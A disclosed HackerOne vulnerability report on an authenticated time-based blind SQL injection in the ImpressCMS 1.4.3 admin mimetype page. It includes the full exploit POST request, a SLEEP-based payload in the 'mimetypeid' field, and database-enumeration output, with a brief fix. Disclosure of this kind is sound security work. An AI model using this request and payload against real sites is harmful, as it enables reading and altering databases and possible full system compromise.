# SQL Injection in version 1.4.3 and below

## Report Details
- **Report ID**: 1506129
- **URL**: https://hackerone.com/reports/1506129
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-03-10T07:55:41.510Z
- **Disclosed**: 2023-08-12T16:44:07.273Z

## Reporter
- **Username**: cyberinsane
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: impresscms

## Vulnerability Information
## Summary:
SQL Injection in ImpressCMS v1.4.3 and earlier allows remote attackers to inject into the code in unintended way, this allows an attacker to read and modify the sensitive information from the database used by the application. If misconfigured, an attacker can even upload a malicious web shell to compromise the entire system.

## ImpressCMS branch :
[1.4]
## Browsers Verified In:

  Google Chrome, Firefox]

## Steps To Reproduce:
Step1- Login with Admin Credentials
Step2- Vulnerable Parameter to SQLi: mimetypeid (POST request):

POST /ImpressCMS/htdocs/modules/system/admin.php?fct=mimetype&op=mod&mimetypeid=1 HTTP/1.1
Host: 192.168.56.117
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------40629177308912268471540748701
Content-Length: 1011
Origin: http://192.168.56.117
Connection: close
Referer: http://192.168.56.117/ImpressCMS/htdocs/modules/system/admin.php?fct=mimetype&op=mod&mimetypeid=1
Cookie: tbl_SystemMimetype_sortsel=mimetypeid; tbl_limitsel=15; tbl_SystemMimetype_filtersel=default; ICMSSESSION=7c9f7a65572d2aa40f66a0d468bb20e3
Upgrade-Insecure-Requests: 1

-----------------------------40629177308912268471540748701
Content-Disposition: form-data; name="mimetypeid"

1 AND (SELECT 3583 FROM (SELECT(SLEEP(5)))XdxE)
-----------------------------40629177308912268471540748701
Content-Disposition: form-data; name="extension"

bin
-----------------------------40629177308912268471540748701
Content-Disposition: form-data; name="types"

application/octet-stream
-----------------------------40629177308912268471540748701
Content-Disposition: form-data; name="name"

Binary File/Linux Executable
-----------------------------40629177308912268471540748701
Content-Disposition: form-data; name="icms_page_before_form"

http://192.168.56.117/ImpressCMS/htdocs/modules/system/admin.php?fct=mimetype
-----------------------------40629177308912268471540748701
Content-Disposition: form-data; name="op"

addmimetype
-----------------------------40629177308912268471540748701
Content-Disposition: form-data; name="modify_button"

Submit
-----------------------------40629177308912268471540748701--

Vulnerable Payload:
1 AND (SELECT 3583 FROM (SELECT(SLEEP(5)))XdxE)   //time-based blind (query SLEEP)

Output:
web application technology: Apache 2.4.52, PHP 7.4.27
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
available databases [6]:
[*] impresscms
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test

## Suggestions to mitigate or resolve the issue:
Use Parameterized Queries

## Supporting Material/References:
https://github.com/sartlabs/0days/blob/main/ImpressCMS1.4.3/Exploit.txt

  * [attachment / reference]

## Impact

SQL Injection in ImpressCMS v1.4.3 and earlier allows remote attackers to inject into the code in unintended way, this allows an attacker to read and modify the sensitive information from the database used by the application. If misconfigured, an attacker can even upload a malicious web shell to compromise the entire system.

## Attachments
No attachments
